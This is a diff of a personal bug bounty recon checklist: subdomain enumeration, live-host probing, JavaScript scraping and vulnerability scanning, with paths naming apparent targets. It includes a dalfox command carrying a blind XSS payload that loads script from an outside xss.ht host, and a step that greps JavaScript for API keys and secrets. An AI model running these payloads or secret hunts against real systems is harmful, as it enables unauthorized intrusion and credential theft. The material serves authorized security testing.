@@ -8,20 +8,22 @@ Once we’ve fully explored webpages, test them for vulnerabilities.
 
 
 BUG BOUNTY RECON METHODOLOGY
-	1. Gather subdomains with amass or via ProjectDiscovery Chaos
+1. Gather subdomains with amass or via ProjectDiscovery Chaos
 		a. https://chaos.projectdiscovery.io/#/
-	2. Determine which hosts are alive with httprobe
+2. Determine which hosts are alive with httprobe
 		a. Cat [domain list] | httprobe
 		b. Cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt
-	3. Use httpx to find status code 200 subdomains
+3. Use httpx to find status code 200 subdomains
 		a. cat online-domains.txt | httpx -status-code -o httpx.txt | grep 200
 		b. Cat online-domains.txt | httpx -status-code 
-4. Grep for all the domains with status code 200
+4. Get a deeper collection of subdomains with DNSGEN
+		a. Cat online-domains.txt | dnsgen - | httprobe
+5. Grep for all the domains with status code 200
 	e. Cat httpx.txt | grep 200
 	f. Save / edit responses to live.txt
 	g. Make sure to clear code 200
 		a. Replace [200] with blank
-5. Run aquatone against live hosts 
+6. Run aquatone against live hosts 
 	a. Cat live.txt | aquatone
 7. Review screenshots and pages of live hosts gathered
 8. Run hakrawler, GAU, and WayBack to scrape subdomains
@@ -47,7 +49,7 @@ BUG BOUNTY RECON METHODOLOGY
 	a. Change the contents in the alive.txt file with the domains we want to scrape.
 	b. /JSCCanner/script.sh [path to file]
 14. Run JSFinder as a backup
-	a. python3 JSFinder.py -f [path to live subdomains]
+	a. python3 /root/Desktop/tools/JSFinder/JSFinder.py -f /root/Desktop/Bug_Bounty/playstation/PlaystationCom/live.txt
 15. Run grep against the .js files and search for keywords
 	a. API
 	b. Secret
@@ -59,8 +61,8 @@ BUG BOUNTY RECON METHODOLOGY
 	c. XSS
 		a. dalfox file xss.txt -b '"><script src=https://ch1r0n1n.xss.ht></script>' pipe -F
 	d. OPEN REDIRECT
-		1. python3 openredirex.py -l [path to redirect parameters] --payloads payloads.txt
-		2. python3 Injectus.py -f [path to redirect parameters] -op
+		1. python3 openredirex.py -l /root/Desktop/Bug_Bounty/Sqills/redirect.txt --payloads payloads.txt
+		2. python3 Injectus.py -f /root/Desktop/Bug_Bounty/dhs/redirect.txt -op
 	e. SSRF
 	f. IDOR
 	g. LFI
@@ -69,7 +71,4 @@ BUG BOUNTY RECON METHODOLOGY
 	• XSS
 	• IDOR
 18. Check for low hanging fruit with Nuclei
-	a.  nuclei -l [target list] -t [path to nuclei templates]
-
-
-
+	a.  nuclei -l [target list] -t /root/Desktop/tools/Nuclei-Templates/
